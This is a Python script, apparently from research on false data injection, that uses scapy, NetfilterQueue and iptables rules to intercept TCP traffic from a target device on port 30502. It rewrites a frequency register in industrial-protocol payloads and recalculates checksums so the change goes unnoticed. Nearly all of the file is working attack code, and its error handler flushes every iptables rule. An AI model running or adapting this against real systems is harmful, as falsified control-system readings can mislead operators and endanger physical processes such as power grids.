from scapy.all import *
from netfilterqueue import NetfilterQueue
import random

change_values = []
debugging = False

def get_values():
    global change_values
    ## add generated values from FIDA model here
    change_values = list(range(10000,12000,1000))
    ## Testing with random values in List
    return

def modify_packet(scapy_packet):
    global change_values
    global debugging
    try:
        packet = IP(scapy_packet.get_payload())
        if packet.haslayer(Raw):
            payload = packet[Raw].load
            data = payload[9:]

            first_register = int.from_bytes(data[0:2], byteorder="big")
            if first_register == 101 and len(payload) > 100:
                hz_register = int.from_bytes(data[32:34], byteorder="big")
                
                #debug
                if debugging: print("Orginal Frequency:", hz_register)
                
                if len(change_values) == 0: get_values()
                change_value=change_values.pop(0)
                          
                #debug        
                if debugging: print("Change Value:", change_value)
                
                new_sec_register = hz_register + change_value
                if new_sec_register < 0:
                    new_sec_register = -new_sec_register
                if new_sec_register > 65535:
                    new_sec_register = 65535-change_value
                new_sec_register_bytes = new_sec_register.to_bytes(2, byteorder="big")
                modified_payload = payload[:41] + new_sec_register_bytes + payload[43:]

                packet[Raw].load = modified_payload

                del packet[IP].len
                del packet[IP].chksum
                if packet.haslayer(TCP):
                    del packet[TCP].chksum
                
                #debug  
                if debugging: print("Modified Frequecy:", new_sec_register)
 

                scapy_packet.set_payload(bytes(packet))
                #debug
                if debugging: print("Modified and sent packet")


        scapy_packet.accept()
    except Exception as e:
        print(f"CRITICAL ERROR: {e}")
        traceback.print_exc()
        scapy_packet.drop() 
        os.system("sudo pkill -f NFQUEUE && sudo iptables -F")

def setup_iptables(ip,port):
    os.system(f'iptables -I FORWARD -p tcp --sport {port} -s {ip} -j NFQUEUE --queue-num 1')

def cleanup_iptables(ip, port):
    os.system(f'iptables -D FORWARD -p tcp --sport {port} -s {ip} -j NFQUEUE --queue-num 1')



if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description='False Data Injection Attack(FDIA)')
    parser.add_argument('target', help='IP of target')
    parser.add_argument('-p', '--port', default='30502',
                       help='Port of target')
    parser.add_argument('-d', '--debug', default=False, action='store_true',
                       help='Debug mode')
    args = parser.parse_args()
    
    ip = args.target
    port=args.port
    debugging = args.debug

    try:
        setup_iptables(ip,port)
        print(f"[*] IPTables rules set on {ip}:{port}")
        nfqueue = NetfilterQueue()
        print("[*] Creating NFQUEUE")
        nfqueue.bind(1, modify_packet)
        print("[*] Starting NFQUEUE")
        print("[*] Waiting for packets")
        nfqueue.run() 
    except Exception as e:
        print("[*] Error:", e)
    except KeyboardInterrupt:
        print("[*] Stopping NFQUEUE")
    finally:
        if nfqueue:
            nfqueue.unbind()
            print("[*] Stopped NFQUEUE")
        cleanup_iptables(ip,port)
        print("[*] IPTables rules removed")
        sys.exit(0)


    #4. Queue Conflict
    #Error: Failed to create queue 0
    #Resolution:
    #sudo rm /run/xtables.lock  # Clear stale lock
    #sudo pkill -f NFQUEUE      # Kill existing queue users